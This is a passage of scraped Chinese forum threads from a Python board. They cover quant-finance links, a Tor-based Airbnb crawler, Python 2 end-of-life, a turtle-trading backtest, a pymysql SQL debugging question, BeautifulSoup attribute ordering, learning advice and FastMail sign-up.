{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://metaquant.org/liang-hua-jin-rong-zhong-15ge-bi-bei-de-pythonku.html\" rel=\"nofollow\">量化金融中 15 个必备的 python 库</a></p>\n</div></div>"], "reply": "1", "tittle": "量化金融中 15 个必备的 python 库", "comment": ["欢迎大家补充"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://github.com/plantpark/AirbnbSpider\" rel=\"nofollow\">https://github.com/plantpark/AirbnbSpider</a>\r<br>\r<br>求 star</div>"], "reply": "2", "tittle": "scrapy 和 tor 配合，打造的爬取 airbnb 房屋信息的爬虫", "comment": ["bs 滥用 tor 当 ip 池的人", "玩大了直接按照 Tor 出口列表打死……然后不管谁用 Tor 都别想用了。"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://pythonclock.org/\" rel=\"nofollow\">https://pythonclock.org/</a></div>"], "reply": "29", "tittle": "python 2💊", "comment": ["Python 2.7 will retire in...\r", "\r", "3Years4Months18Days17Hours12Minutes19Seconds\r", "\r", "Enable Guido ModeHuh?\r", "\r", "What's all this, then?\r", "\r", "Python 2.7 will not be maintained past 2020. No official date has been given, so this clock counts down until April 12th, 2020, which will be roughly the time of the 2020 PyCon. I am hereby suggesting we make PyCon 2020 the official end-of-life date, and we throw a massive party to celebrate all that Python 2 has done for us. (If this sounds interesting to you, ", ").\r", "\r", "Python 2, thank you for your years of faithful service.\r", "\r", "Python 3, your time is now.\r", "\r", "How do I get started?\r", "\r", "If the code you care about is still on Python 2, that's totally understandable. Most of PyPI's popular packages now work on Python 2 and 3, and more are being added every day. To ease the transition, the official porting guide has advice for running Python 2 code in Python 3.", "看标题吓一跳…这不是还有三年呢么", "还有３年 4 个月呢，拖延症患者表示两年以后再考虑...", "看来以后的项目都得优先支持 python3 了。\r", "\r", "从 2 迁移到 3 的工作量其实还好。\r", "只是如果之前测试用例写的不完整，测试是个麻烦事。\r", "另外一些项目代码量已经很大了也是头痛。", "微软早就说停止 XP ， IE 678 了，然而你看看这国内市场占有率。", "IPV4 地址早就说用完了，然而你看看现在的 IPV6 普及率。", "估计 2025 年国内业界还是一片 2.7.x", "难", "还在用 centos 5 的企业表示  2.2 够用了。", " 相当一部分的代码可以通过自动化工具转换吧 ", "\r", "ps. Python 2 支持到 2020 年早就宣布了吧。。也不是最近的事", "Python 2 还能再战 3-5 年。", "centos 还是用 2.6 的，好久过期了，一直期盼过期好督促公司人切换到 3.0 来", "还有 3 年就不用兼容 Python2 了，想想还有些激动呢", "啥时 macOS 自带的 Python 版本能从 2 换到 3 呢？要不然分发些小脚本还是写 Python 2 方便啊。", "这都不是事儿，还在公司写 python2.6 呢", "三年后就可以考虑学习一下 python 了，恩", "代码迁移其实还好啦， Python3 的新语法特性确实很不错。", " 哪里能找到比较靠谱的资料吗？搜出来的不知道可靠性怎么样…", " 并不是自动转完就可以一遍过的，很多地方还是需要自己做些调整的。\r", "就新项目而言，真没啥必要继续用 py2 了。\r", "如果你用到的哪个库不支持 python3 ，很可能是有了新的替代品。", "举个例子…… windows xp", "asp 到现在还没死呢", "ios6 ，嗯哼？现在几乎没人用了。", " ", "说不定会有 python2.8 呢\r", "doge", "不急，到时候我估计已经不写 Python 了", "各种 JIT Python 出来续一秒", "公司项目还是 2.7", "python 2 退休前会不会出 python 4 ？\r", "（我想说我没啥恶意。）", " 也想到这个, 😀", "想起了巨硬 IE"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在使用 gevent 时候真的很佩服它的强大，但是在使用中有一个问题一直比较头疼，如图：<br>\n<img alt=\"\" src=\"http://i1.piimg.com/567571/d3d7c0ada2aba8e8.png\"><br>\n不知道有没有什么更好的写法~</p>\n</div></div>"], "reply": "7", "tittle": "求教一个 gevent 相关问题", "comment": ["比如。。。用列表生成式么\r", "[gevent.spawn(item) for item in tmp]", "楼主应该才开始写 python\r", "```python\r", "gevet.joinall([gevent.spawn(tmp[i]) for i in range(5)])\r", "```", "我不厚道的觉得楼主不但刚学 python ，而且是刚学编程，怎么的也可以是 for i.. : temp[i]吧", "gevent.pool", " \r", " \r", " \r", " \r", "谢谢各位回复，刚刚学习 Python 不久~", "   参考 Groups and Pools", " 谢谢指点~"]},
{"content": ["<div class=\"topic_content\">前言\r<br>\r<br>虽为期货小白，本萌也忍不住来感受下 T+0 和做空的感觉~\r<br>\r<br>之前有写过股票海龟交易系统的帖子——海龟交易系统的实现，获得了广大 V 友的好评和收藏 <a target=\"_blank\" href=\"https://uqer.io/community/share/57bd5864228e5b79a575a9b2\" rel=\"nofollow\">https://uqer.io/community/share/57bd5864228e5b79a575a9b2</a>\r<br>关于海龟交易的详细介绍可参见该帖。所以我再接再厉，将海龟交易系统套用在期货回测商品上。本帖主要是体验期货回测及将海龟交易移植到期货平台看看效果~\r<br>\r<br>一、海龟交易步骤回顾：详细交易步骤： <a target=\"_blank\" href=\"https://uqer.io/community/share/5812b3e5228e5b43f85c2252\" rel=\"nofollow\">https://uqer.io/community/share/5812b3e5228e5b43f85c2252</a>\r<br>\r<br>唐奇安通道捕捉突破。对于唐安奇通道的天数 N 设置，之前设置为 20 天。但个人觉得在期货日线中这个天数还是略久，反应比较慢。因此觉得 N 设为 5 或 10 较好；当然分钟线的话得另行讨论\r<br>\r<br>计算平均真实波幅 ATR\r<br>\r<br>计算每次加仓 1unit ，购买的手数\r<br>\r<br>捕捉突破，判断开仓方向\r<br>\r<br>判断是否加仓、是否止损\r<br>\r<br>若止损了回到 4 ，未止损回到 5\r<br>\r<br>二、需要用到的计算、判断函数\r<br>\r<br>具体代码见下个 cell\r<br>\r<br>IN_OR_OUT 用来判断唐奇安通道的突破（上轨突破或下轨突破），从而判断多开还是空开\r<br>\r<br>CalcATR 用来计算 ATR\r<br>\r<br>Add_OR_Stop 用来判断加仓还是止损\r<br>\r<br>CheckPosition 用来检查当前持仓状态\r<br>\r<br>CalcUnit 用来计算买入 1unit 对应的手数\r<br>\r<br>三、回测： <a target=\"_blank\" href=\"https://uqer.io/community/share/5812b3e5228e5b43f85c2252\" rel=\"nofollow\">https://uqer.io/community/share/5812b3e5228e5b43f85c2252</a>\r<br>\r<br>3.1 对于回测的一些说明\r<br>\r<br>3.1.1 initialize(futures_account)的说明：\r<br>futures_account.last_deal_prcie 为上一次交易的价格\r<br>\r<br>futures_account.limit_unit 为持有最多 unit 的个数\r<br>\r<br>futures_account.unit 为 1 个 unit 的手数\r<br>\r<br>futures_account.add_time 为加仓次数（不超过 futures_account.limit_unit ）\r<br>\r<br>futures_account.position_state 用来记录持仓状态： 0 为未持仓， 1 位持多，-1 为持空\r<br>\r<br>futures_account.last_main_symbol 用来记录主力合约，在主力合约忽然变化的时候进行相关处理\r<br>\r<br>3.1.2 主力合约变化的情况\r<br>\r<br>期货回测平台目前没考虑主力合约更换的情况。一般有两种处理：\r<br>\r<br>持有原合约，出现主力合约变更时，对原合约平仓，并买入更换的主力合约\r<br>\r<br>持有原合约，出现主力合约变更时，对原合约平仓，但是不一定买入新合约，而是根据策略逻辑判断是否买入\r<br>\r<br>本策略采用第二种方式处理\r<br>\r<br>3.2 日线螺纹钢测试：\r<br>\r<br>策略设定：\r<br>\r<br>唐奇安通道 N 设定为 5\r<br>\r<br>最大持有 unit 数为 4 （最多加 3 次仓）\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/qipdUA9pl.png\" title=\"在新窗口打开图片 qipdUA9pl.png\"><img src=\"//i.v2ex.co/qipdUA9pl.png\" class=\"embedded_image\"></a>\r<br>\r<br>分析：\r<br>\r<br>收益曲线挺像阶梯上行，说明较好的实现了海龟交易的理念\r<br>\r<br>从策略表现来看，年化收益 126%，夏普比率 3.76 ，表现不错；最大回撤 12.2%，还不错，本身海龟策略的动态 ATR 止损，而且仓位控的好，回撤应该不大，但由于日线原因，有些时候无法及时触发止损，因此回撤也不是特别小。\r<br>\r<br>观察收益曲线发现，回撤较大的地方往往是一波涨势之后，回想 ATR 止损，是在最后一次买入价格 last_deal_price 的基础上减去 2ATR 作为止损点的，当盈利很大之后，止损点就显得有点“跟不上”了，因此，这是个可以改进的点。不过就像上面说的，日线的话很可能不能及时触发止损，因此这里止损点改进的问题暂不讨论。\r<br>\r<br>再看看 ATR 、价格的曲线及仓位变化情况：\r<br>\r<br><a target=\"_blank\" href=\"/i/rGxXZMXNl.png\" title=\"在新窗口打开图片 rGxXZMXNl.png\"><img src=\"//i.v2ex.co/rGxXZMXNl.png\" class=\"embedded_image\"></a>\r<br>\r<br><a target=\"_blank\" href=\"/i/54hZwpUkl.png\" title=\"在新窗口打开图片 54hZwpUkl.png\"><img src=\"//i.v2ex.co/54hZwpUkl.png\" class=\"embedded_image\"></a>\r<br>可以看出，当价格波动幅度变大时， ATR 变大。在趋势反转区域，出现了较大波动，由于 ATR 计算平均真实波幅，在反转之后才到达高点，这就使得处于趋势反转时，止损点反而下移了，因此止损有一定“延迟”。\r<br>\r<br>观察仓位发现，最多仓位没超过 60%，大部分情况轻仓操作，仓位在 30%左右。不过风险厌恶程度不高的话，可以适当提高 unit 的最大值，以博取更高收益。\r<br>\r<br>3.3 不同商品，在唐奇安通道 N 分别为 5 ， 10 ， 20 时的策略表现： <a target=\"_blank\" href=\"https://uqer.io/community/share/5812b3e5228e5b43f85c2252\" rel=\"nofollow\">https://uqer.io/community/share/5812b3e5228e5b43f85c2252</a>\r<br>\r<br>选取品种为： 螺纹钢、焦炭、铅、焦煤、锌、铜\r<br>\r<br><a target=\"_blank\" href=\"/i/mRdXmegbl.png\" title=\"在新窗口打开图片 mRdXmegbl.png\"><img src=\"//i.v2ex.co/mRdXmegbl.png\" class=\"embedded_image\"></a>\r<br>\r<br><a target=\"_blank\" href=\"/i/scEKjr12l.png\" title=\"在新窗口打开图片 scEKjr12l.png\"><img src=\"//i.v2ex.co/scEKjr12l.png\" class=\"embedded_image\"></a>\r<br>分析:\r<br>\r<br>从表现来看，焦炭的收益最高，达年化 153.3%，螺纹钢次之，接着是焦煤。 铅则为小亏，锌是雪崩了啊。。。\r<br>\r<br>对于各个品种，除了焦炭和锌，其余品种 唐奇安通道 N 值为 5 的时候表现最好，与预期相同。\r<br>\r<br>从回撤看，除了锌比较特殊之外，大部分情况回撤都小于 20%，说明海龟策略对回撤的控制还是不错的，加上上面对止损提出的改进思路，应该还能做的更好。\r<br>\r<br>小结： <a target=\"_blank\" href=\"https://uqer.io/community/share/5812b3e5228e5b43f85c2252\" rel=\"nofollow\">https://uqer.io/community/share/5812b3e5228e5b43f85c2252</a>\r<br>\r<br>从回测来看，海龟交易策略还是挺适合部分商品期货的，但是对于不同的品种，由于其自身特性不同，对于参数的设定还值得推敲，例如最大 unit 数，这个对于不同品种仓位控制效果需求可能不同；再如唐奇安通道的 N 值，在分钟线如何设定值得研究\r<br>\r<br>这里没有设定止盈，我个人的理念是不设止盈，控制好止损，让利润奔跑。文中止损点还有优化的空间，在盈利充分的时候，应当上移止损点锁住更多利润\r<br>\r<br>对于分钟线回测，目前回测框架似乎不完善， 1 分钟线回测收益高的离谱。。有兴趣的矿友可以试试。期待下个版本~\r<br>\r<br>小伙伴们，期货回测该玩起来辣</div>"], "reply": "13", "tittle": "[期货回测] 海龟交易×商品期货", "comment": ["可以不可以带新人进来玩", " 当然可以啦：）", "一分钟好得离谱是只设置了手续费，没有设置滑点吧", " 商品的 ticksize 非常的大，滑点控制不好", " 恩，有道理，这里我再多思考思考，把模型设置的更精准：）蟹蟹提出哈", "螺纹钢收益大也是由于今年‘去产能’去的好吧。。。。。但是我就是想做 K 线的趋势交易，不单单限于创业板指数， ETF ，股票 K 线，这个也能实现么？》", "哎，，，又来一个\r", "早点放弃吧。不好意思，说的比较直接。。 希望不要介意\r", "我看过 n 多，用这么海龟，什么之类的，上个世纪的东西，希望能在交易市场赚钱。  \r", "成功的几率应该和买彩票中大奖差不多\r", "\r", "有太多人加入进来，做这种所谓的“回测”。。。  如果你练练代码，玩下可以，，指望挖出策略赚钱，，可以醒醒了！！\r", "\r", "实质的建议\r", "目前能够稍微试试的就那么几种\r", "1. 基于 order book 的 market making ，。 就是真正的 HFT ， 门槛很高，，现在基本都是在拼硬件了\r", "2. 基于 spread 和 assert class 的 spread 动态套利，，比如期货不同月份合约， 还有那种 lme 铜期货和上交所 cu 铜期货直接的动态套利，现在空间也越来越小\r", "3. relative value ， 比如在美国股票的同一个板块，买最强的那只，空最弱的，同时用 option 来避免波动\r", "4. globe macro ，，， 比如，， 美国大选后，， 去买多 russell 2000 然后去 short 新兴市场。 宏观对冲\r", "\r", "你跑出来的曲线，，和实际几乎一点关系都没有\r", "1. 数据进度，  最多就是 tick+ last price ， bid ask order book ， market depth 完全没有。  简单的说，你的订单根本无法成交，或者 spread 太大\r", "2. 你没有考虑资金，， 交易手续费随时调整， 保证金随时调整。  可能中途就挂的没钱\r", "3. 一个动态的市场，每次逻辑都不一样， 你要用固定的方法，， 基本就会挂，  什么海龟，本质就是 trend following ，说白了就是追踪趋势，， 拜托，，，，如果你要知道有趋势，或者趋势什么时候反转，你用什么都一样，，   那么用个均线，，收益不会和你的这个差太多。。。     海龟这种 trend following ，在市场 chop ，就是震荡的时候，会被杀的裤子都没有，，，     不信你试试看跑下今年的 pta ， c 之类或者 2012~2014 的 a 股。。。你再试试，用简单的两条均线 sma200+sma5  去跑焦炭，，赚的绝对不会比你这个复杂的差\r", "4. 1 分钟，，， lmaoooooooooooo 。。。           来实盘，我等你。   哈哈哈\r", "\r", "准备研究这个，或者几个什么指标组合， k 线形态之类不具备专业知识。。。 最好建议你们不要实盘，，当成好玩的不错，，来实盘，钱早晚被我赚走，， lol\r", "\r", "\r", "PS: 中国期货好像做的最好的都是对产业很了解的，不管是现货还是期货。而且，虽然你看他们在 RB 上的仓位很大，其实早些时候，他们都是同时去 short i ，空铁矿石，，用此来做空钢厂利润.。\r", "a 股，，今年的主流策略都是， 网下打新+ alpha + 底仓 T+0 。  所以现在的日均波动越来越小。", "祝你好运", "r#9 @", " 老司机阿", " 感谢指点，能抓老鼠就是好猫，及时做韭菜也要做一颗茁壮成长的韭菜：）", "多少倍杠杆？"]},
{"content": ["<div class=\"topic_content\">因为有个需求需要每天按时导表，我懒得天天手动导，希望能用 python 来实现导表+发邮件的工作  \r<br>然而我就是个做表的，对 python 的了解也就限于安装与卸载这种程度…所以在编写的时候遇到了很多麻烦  \r<br>我现在就卡在了 sql 查询有语法错误上，同样的查询，放在 navicat 和 excel 里都是能正常查询的  \r<br>然而不知道为什么 python 就总是说\"you have an error in your SQL syntax\" ╮(╯ _╰)╭  \r<br>希望各位 CS dalao 能帮我看一下是哪里写的不对，靴靴  \r<br>import pymysql\r<br>conn = pymysql.connect(host='****', port=3307,user='****',passwd='****',db='autocar',charset='UTF8')\r<br>cur = conn.cursor()\r<br>sql = \"SELECT\\\r<br>\tcontract.contract_number AS 合同编号,\\\r<br>\tapply.into_time AS 进件时间,\\\r<br>\tcontract.actual_loan_time AS 放款确认时间,\\\r<br>\tapply_detail.city_manager AS 城市经理,\\\r<br>\tapply_detail.marketing_manager AS 市场经理,\\\r<br>\tapply_detail.sales_name AS 销售姓名,\\\r<br>\tapply.org_name AS 分公司,\\\r<br>\tapply.product_name AS 产品名称,\\\r<br>\tapply.loan_term AS 借款期限,\\\r<br>\tcontract.loan_amount AS 合同金额,\\\r<br>\tn.statusdes AS 实时状态\\\r<br>FROM apply\\\r<br>LEFT JOIN contract ON contract.apply_id = apply.apply_id\\\r<br>LEFT JOIN apply_detail ON apply_detail.apply_id = apply.apply_id\\\r<br>LEFT JOIN (\\\r<br>\tSELECT\\\r<br>\t\tgroup_concat(DISTINCT c.status_code SEPARATOR '||') AS statussum,\\\r<br>\t\tc.is_in_node,\\\r<br>\t\tc.apply_id,\\\r<br>\t\tgroup_concat(DISTINCT c.status_name SEPARATOR '||') AS statusdes,\\\r<br>\t\tgroup_concat(DISTINCT c.operator_name SEPARATOR '||') AS operatornames\\\r<br>\tFROM\\\r<br>\t\tnode_record c\\\r<br>\tWHERE\\\r<br>\t\tc.is_in_node = 1\\\r<br>\tAND c.is_valid = 1\\\r<br>\tGROUP BY c.apply_id\\\r<br>) n ON apply.apply_id = n.apply_id\\\r<br>WHERE\\\r<br>\t1 = 1\\\r<br>AND apply.is_ex_apply = '1'\\\r<br>AND apply.borrowing_type = '1'\\\r<br>AND apply.into_time &gt;= '2016-11-1'\\\r<br>AND apply_detail.sales_name NOT LIKE '%测试%'\"\r<br>cur.execute(sql)\r<br>for i in cur:\r<br>    print(i)\r<br>cur.close()\r<br>conn.close()</div>", "<div class=\"topic_content\">Traceback (most recent call last):\r<br>  File \"C:/Users/linch/PycharmProjects/untitled/connect_mysql.py\", line 39, in &lt;module&gt;\r<br>    cur.execute(sql)\r<br>  File \"C:\\Users\\linch\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\pymysql-0.7.9-py3.5.egg\\pymysql\\cursors.py\", line 166, in execute\r<br>    result = self._query(query)\r<br>  File \"C:\\Users\\linch\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\pymysql-0.7.9-py3.5.egg\\pymysql\\cursors.py\", line 322, in _query\r<br>    conn.query(q)\r<br>  File \"C:\\Users\\linch\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\pymysql-0.7.9-py3.5.egg\\pymysql\\connections.py\", line 835, in query\r<br>    self._affected_rows = self._read_query_result(unbuffered=unbuffered)\r<br>  File \"C:\\Users\\linch\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\pymysql-0.7.9-py3.5.egg\\pymysql\\connections.py\", line 1019, in _read_query_result\r<br>    result.read()\r<br>  File \"C:\\Users\\linch\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\pymysql-0.7.9-py3.5.egg\\pymysql\\connections.py\", line 1302, in read\r<br>    first_packet = self.connection._read_packet()\r<br>  File \"C:\\Users\\linch\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\pymysql-0.7.9-py3.5.egg\\pymysql\\connections.py\", line 981, in _read_packet\r<br>    packet.check_error()\r<br>  File \"C:\\Users\\linch\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\pymysql-0.7.9-py3.5.egg\\pymysql\\connections.py\", line 393, in check_error\r<br>    err.raise_mysql_exception(self._data)\r<br>  File \"C:\\Users\\linch\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\pymysql-0.7.9-py3.5.egg\\pymysql\\err.py\", line 107, in raise_mysql_exception\r<br>    raise errorclass(errno, errval)\r<br>pymysql.err.ProgrammingError: (1064, \"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'applyLEFT JOIN contract ON contract.apply_id = apply.apply_idLEFT JOIN apply_det' at line 1\")\r<br>\r<br>Process finished with exit code 1</div>"], "reply": "9", "tittle": "求教，怎样在 python 里执行 sql 查询……", "comment": ["能把报错信息发上来吗？", "% 要变成 %%", " 试过了，还是报错有语法错误……", ">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'applyLEFT JOIN contract ON contract.apply_id = apply.apply_idLEFT JOIN apply_det' at line 1\r", "\r", "apply 和 LEFT JOIN 之间少了空格。这么长的字符串直接用三引号\"\"\"str\"\"\"，会保留所有回车和空格，不用加这么多斜杠。", "\\ 转义一下特殊字符？", " 有用！蟹蟹！ QAQ", "我是链接的 mssql ，中文传数据使用%s ，报错\r", "\r", "比如 selrct  * from table where rwa=%s 然后传一个从数据库查到的值，英文没问题，中文和带大小于号的报错", "自从用了 pandas, 读写 db, 文件再也不郁闷了\r", "import pandas as pd\r", "pd.read_sql()", " +1\r", "再做点 sql 很难做的计算，随手保存个 Excel 、 csv 什么的，简直不要太爽"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://metaquant.org/liang-hua-jiao-yi-chu-xue-zhe-bi-du-de-wu-ben-shu.html\" rel=\"nofollow\">量化交易初学者必读的五本书</a></p>\n</div></div>"], "reply": "2", "tittle": "量化交易初学者必读的五本书", "comment": ["挺好的! 不过 mac 下字体真的很难看 \r", "建议去掉    font-family: 'BodoniMTItalic','KaiTi';", " 是吗， WIN 下看着还好啊，没有在 MAC OS 下测试过，之后测试看看"]},
{"content": ["<div class=\"topic_content\">我发现 BS4 处理代码时会改变属性的顺序，\r<br>&lt;td height=\"250\" class=\"infodetail\" id=\"TDContent\" valign=\"top\"&gt;\r<br>上边这行代码经过 BeautifulSoup(htmlstr,'html.parser')处理后会变成\r<br>&lt;td class=\"infodetail\" height=\"250\" id=\"TDContent\" valign=\"top\"&gt;\r<br>很显然，这是根据标签属性的顺序进行了重新排序，有什么方法能不能取消这种排序吗？\r<br>\r<br>(我因为装了几次 lxml 都不成功，所以还是在用 html.parser)</div>"], "reply": "10", "tittle": "能不能不让 BS4 重新排序？", "comment": ["排序的问题我不知道怎么解决，但是我刚刚在一 V 友指点下成功安装 lxml ，这点可以分享给你\r", "秘诀就是……把这几个库装全： python-dev libxml2 libxml2-dev libxslt-dev gcc make", "同时我还帮你测试了下， lxml 不会重新排序标签属性  \r", "![lxml]( ", " )", " 好的，我先试试，谢谢", "我用 python3 执行 没出现楼主的情况", " 我是 python34", " 不行啊，装了 lxml 后，仍然会重新排序，而且还把<html><body>给加了上。。。", " 哦，我细看了下你的代码，最后一行，你打印的是 a ，难道不应该是 str(s)吗？", " 对哦，我智障了\r", "试了打印 s ，果然还是会按字母顺序给属性排序，同时加上 html 和 body", "这会影响什么嘛？", " 容易造成混乱，如果没有重新排序，在原代码里手动也能搜到，重新排序后就搜不到了。"]},
{"content": ["<div class=\"topic_content\">坐标在成都，学习 python 半年左右，学校木有开设这门课程，学校老师好多都不知道这个语言，好吧，我的学校很撇的。学习质料全部来自网上。目前的困惑在于，很多问题通过搜索出来的答案总是看不懂。思维好像总是不能进入程序的世界。困惑很多，但是依然在坚持学习 python ，弱弱的问问，有没有老司机，愿意带带我。</div>"], "reply": "24", "tittle": "关于学习 python 的一点问题。", "comment": ["网上资料水平良莠不齐，会浪费很多时间。刚开始学还是看书靠谱， V2EX 右边就有书推荐。", "试着写网站或者爬虫实践下", "是不是因为你使用百度+中文搜的? 建议换用谷歌+英文搜, 你会发现打开了新世界", "自己学确实会走一些弯路，这是没有办法的事情。\r", "有人带当然更好，没人带的话就抱着踩坑的觉悟匍匐前进。反正比在寝室打游戏好很多。", "还有别总看书看文章，觉得差不多了硬着头皮做点东西，然后看开源代码，再回过头来看书会比当初看书有更多感悟。", "算法、数据结构，觉得卡懂了就用 Python 实现一下，然后再去看看 GitHub 上别人的解决方法，然后找不同，分析为什么别人那么写，你为什么这么些，各有什么优劣\r", "\r", "以及右侧的推荐书目都看过吗，看过都懂吗，懂了自己能实现吗\r", "\r", "然后再看右侧的项目，都试着用用，然后看源码，然后再结合你的想法，写新的项目或者在实现一遍", "有人带的好处有两个，\r", "一个是最佳实践，减少踩坑的次数。（其实自己多踩踩坑对自己的能力提升也有好处）\r", "另一个是，你想做一个项目需要知识储备 12345.如果有人带，你只需要学会 123 ， 4 和 5 带你的人会帮你搞定。这样学起来会更轻松。\r", "如果没人带，你必须 12345 都学会。才能开始做项目。所以纯自学是很痛苦的事情。\r", "\r", "纯自学飘过。。。共勉。", "我也学半年了，感觉还没入门", "Python 我大概学了两三天就做项目了，学半年都在研究什么?", " 蟹蟹你的建议 能给个联系方式吗？", " 这是我学的第一门语言，之前没有编程基础", " 有写过一个查询天气的这样一个小程序，一开始完全不知道从何处下手，可以说是 对于该怎么来写这样一个程序的思路都没有 就是我说的无法思维无法进入程序的世界 感觉还是知识不足", "坐标成都，目前每天都在学，可以交个朋友一起学。不过我才学了几天，只会写个小爬虫。", "多写多看", "纯自学，在网上跟着<零基础学 Python>(后来发现官方文档才是讲的最好的)学的，坚持使用 markdown 记笔记，看了一下笔记，大概是今年 3 月份开始学的， 5 月 19 号用 Django 搭建了第一个 blog ， 8 月份开始用 Python 处理数据，最近用 tornado 搭了个聊天室(其实是作业)，经验就是不能光看，要敲，刚开始我也是在终端下慢慢敲的，可以做做练习， Python 很友好，用 c 语言的思维也能做出来，但是不符合 Python 的教义，慢慢转变思维，你会发现 Python 大法好啊！", "可以看看廖雪峰的 python 教程", " 老男孩出来了。哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈", "推荐一个安卓软件 learn python 挺好的。\r", "另外可以看廖雪峰的 python 教程（网页）\r", "看下 python 学习手册（纸质）.\r", "学东西，心要静，其实把手上的已有书都看 2 遍，比什么都强。", "直接找个实习吧，有压力是好事，我之前什么都不会实习领导直接让上项目，被逼着每天学", "学校是学基础的.. \r", "python 这些自学就可以了..", "可以交流一下啊： UVE6MTA4MzQxNTU3NQ==", "正在自学中", " 你联系方式多少？", " 这是什么加密 没看出来。。。。"]},
{"content": ["<div class=\"topic_content\">本人开发了一个小的 web 程序，用 tornado+motor+gevent patch 开发，发现用 pypy 请求一次 GET 需要 5480MS ，而 CPython 只要 400ms ，到底什么原因导致了同样的代码 pypy 比 cpython 还要慢呢？</div>"], "reply": "10", "tittle": "遇到了一个 pypy 的匪夷所思的性能问题", "comment": ["很可能你用的 gevent 版本与 pypy 之间无法很好的玩耍呗", "你做下压力测试， JIT 后期肯定要比 CPython 要快", " 并没有一直很慢", "gevent 这种走扩展的 pypy 的 jit 优化不了, 单 tornado 倒是能把性能拉很高, 不过, tornado 搭 gevent 的组合好奇怪", "都 gevent 了，还干嘛用 tornado ，然后再 pypy ，这简直不兼容的合集。。。。", " 我可以试一试", " 感谢已经解决", "motor 和 gevent 确定不会相互影响？ motor 本来不就是异步的么？还有什么库需要 gevent 么？", " 那么说一下为什么呗？", " gevent 的原因，具体是怎么被影响都不清楚...."]},
{"content": ["<div class=\"topic_content\">还是关于这个 BS4 处理代码重新排序的问题，如下：\r<br>&lt;td height=\"250\" class=\"infodetail\" id=\"TDContent\" valign=\"top\"&gt; \r<br>上边这行代码经过 BeautifulSoup 处理后会变成 \r<br>&lt;td class=\"infodetail\" height=\"250\" id=\"TDContent\" valign=\"top\"&gt; \r<br>根据标签属性的顺序进行了重新排序。\r<br>\r<br>我现在想着手在 BS4 的原代码里修改，让其禁止排序，原样输出，可是看了代码后就蒙了懵了，根本不知道从哪下手啊。。。\r<br>__init__.py  dammit.py  diagnose.py  element.py  testing.py\r<br>BS4 有这几个文件，得从哪里开始啃？</div>"], "reply": "5", "tittle": "我想修改 BS4 的原代码，让其禁止重新排序，不知道该改哪？", "comment": ["attrs 是用 dict 存的， dict 本身就不保证顺序，然后在 decode 的时候还做了排序，如果要保序，你需要把 attrs 改造成 list ，然后所有读写 attrs 的地方都要修改，估计得小半天才能改完", "顺序有什么关系吗？", "启动 python 前加 PYTHONHASHSEED=0 环境变量。搜一下你就知道为吗乱续了", " OrderedDict 会不会更容易改些……", "乱序是 xml 标准的一环\r", "不是 bs4 带来的乱序,是 xml 的 parser 引起的乱序\r", "elementtree 可以 hack 它的函数,来保持原有的顺序(sf 上有人贴了代码的)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>FastMail 之前的开了 Google 的 Capthca 服务，所以只能通过 VPN 。\n但是如果开了 VPN ，第二步输入手机号就会无法收到短信确认。</p>\n<p>经过与 fastmail 的客服一些列沟通，他们解决了第二步无法收到短信的问题。</p>\n<p>亲自测试，可以通过 VPN 注册完成。</p>\n</div></div>", "<div class=\"topic_content\">不是免费，是可以注册。\r<br>\r<br>之前的情况是\r<br>1 ）不用 vpn ，通不过第一步，因为 gogole 的 capchta 无法加载 到页面上\r<br>\r<br>2 ） 用了 vpn ，通不过第二步，因为用了 vpn 导致无法使用国内手机号。\r<br>\r<br>所以原则上，在国内的话，是没有办法成功注册 fastmail.\r<br>\r<br>另外，已经打算把邮箱从 gmail 和 163 转移到 fastmail ，体验非常好。尤其支持 alias 功能，非常实用。</div>"], "reply": "25", "tittle": "FastMail 可以注册了", "comment": ["唔，很早以前没墙的时候注册了。而且当时不用手机号……感觉邮箱别名功能比较方便，但似乎有些国内邮件收不到。", "为何是 python 节点？", "等等,fastmail.com 有墙了？是我用了 pac 模式没注意到？", "alias 收费么？", "FastMail 啥时候免费了？\r", " 不收费，自己域名无限个数", "不一直可以注册吗？只是要钱（可试用一个月）\r", "另： QQ 邮箱收不到信", " 感谢回复，搜到了以前这贴 ", "\r", "提到了 ", "\r", "\r", "The following limits apply to the account as a whole, depending on the plan:\r", "\r", "Basic\tStandard\tProfessional\r", "№ aliases\t600, plus 15 for every user in the account\r", "№ domains\tNone\t100, plus 1 for every user in the account", " 还有另一种别名方式不限个数。比如你邮箱是 ", " ，可以支持 ", " 接收邮件， xxxx 可以是任意长度和字符。", "其实要用域名邮箱的话 可以用 zoho 的\r", "\r", " worksmobile 以前免费现在好像收费了  naver 的 请问猫神了解贵公司的这个产品不？@onevcat", "  也用不到那么多 嘿嘿\r", "\r", " 还真是 退信了 “ mx3.qq.com[184.105.206.86] said: 550 Ip frequency limited.”", " 没有墙，是注册环节有问题，导致国内用户无法成功注册。", " 额，应该用什么节点比较合适？", "为什么不用 gmail", " zoho 不便宜啊，算下来的话和 gmail 差不多了吧", "我并没有碰到你说的之前的问题", "怎么不用 outlook 呢， outlook 不是也支持 alias 么", "yandex ，好像无限 alias ，还是免费的", "确实 MsMail 、 Gmail 、 163 、 QQ 等的用户体验都不怎么样，但免费啊", "谁和你说之前注册不了的 我都用了好几个月了", "手机 outlook app 可以收 gmail 了，比自己翻墙收还快，还有推送", "一直都可以吧…用了一年了都 没有要填手机号啊？", " 嗯 outlook 现在做的不错 然后 alto 也挺好我觉得。", " 而且 